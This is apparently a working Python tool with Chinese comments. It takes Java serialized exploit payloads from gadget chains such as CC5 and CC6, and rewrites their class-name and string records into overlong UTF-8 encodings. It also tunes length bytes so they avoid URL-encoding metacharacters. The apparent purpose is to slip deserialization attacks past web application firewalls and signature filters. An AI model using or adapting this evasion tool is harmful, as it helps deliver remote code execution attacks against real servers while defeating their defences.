# -*- coding: utf-8 -*-
"""保守线性扫描的非最短 UTF-8 变异器（适用于不含 [B 原语数组、
blockdata 仅为小整数块的链，如 CC5/CC6）。
扫描规则：仅当 (0x72|0x74) + u2len + len 字节全部为可打印 ASCII 时重编码。
Java 类字节码（TemplatesImpl._bytecodes）会大量出现该模式，含此类数组的链
（CB1 等）不可用本脚本，改用结构化 utf8_mutate.py。
"""
import sys


def expand(body, force_odd_len=False):
    """ASCII(modified-UTF8 1字节段) -> 非最短形式。
    force_odd_len=True 时首字符用 3 字节形式，使总长为奇数——避开
    urlencoded CT 下长度前缀低字节撞上 & % = + 等元字符（0x26 等）。"""
    out = bytearray()
    i, n = 0, len(body)
    first = True
    while i < n:
        b = body[i]
        if b < 0x80:
            if force_odd_len and first:
                # 3 字节 modified-UTF8 非最短形式：E0|b>>12, 80|(b>>6)&3F, 80|b&3F
                out += bytes([0xE0 | (b >> 12), 0x80 | ((b >> 6) & 0x3F),
                              0x80 | (b & 0x3F)])
            else:
                out += bytes([0xC0 | (b >> 6), 0x80 | (b & 0x3F)])
            first = False
            i += 1
        elif b >> 5 == 0b110:
            out += bytes([b])
            i += 2
        elif b >> 4 == 0b1110:
            out += bytes([b])
            i += 3
        else:
            raise ValueError("non-ascii byte %02x" % b)
    return bytes(out)


BAD_PREFIX = (0x26, 0x3D, 0x25, 0x2B)  # & = % +


def mutate(stream):
    if stream[:2] != b"\xac\xed":
        raise ValueError("not a java serialization stream")
    out = bytearray()
    i, n = 0, len(stream)
    while i < n:
        b = stream[i]
        if b in (0x72, 0x74) and i + 3 <= n:
            ln = (stream[i + 1] << 8) | stream[i + 2]
            if 0 < ln <= 0x7FF and i + 3 + ln <= n:   # 上限防误吞
                body = stream[i + 3:i + 3 + ln]
                if all(0x20 <= c < 0x7F for c in body):
                    newbody = expand(body)            # UTF 前缀=字节数，须重写
                    if (len(newbody) & 0xFF) in BAD_PREFIX or \
                            (len(newbody) >> 8) in BAD_PREFIX:
                        newbody = expand(body, force_odd_len=True)
                    out.append(b)
                    out += len(newbody).to_bytes(2, "big")
                    out += newbody
                    i += 3 + ln
                    continue
        out.append(b)
        i += 1
    return bytes(out)


if __name__ == "__main__":
    raw = open(sys.argv[1], "rb").read()
    m = mutate(raw)
    with open(sys.argv[2], "wb") as f:
        f.write(m)
    print("[*] %s: %d -> %d bytes (naive utf8-nonshort)" % (sys.argv[2], len(raw), len(m)))
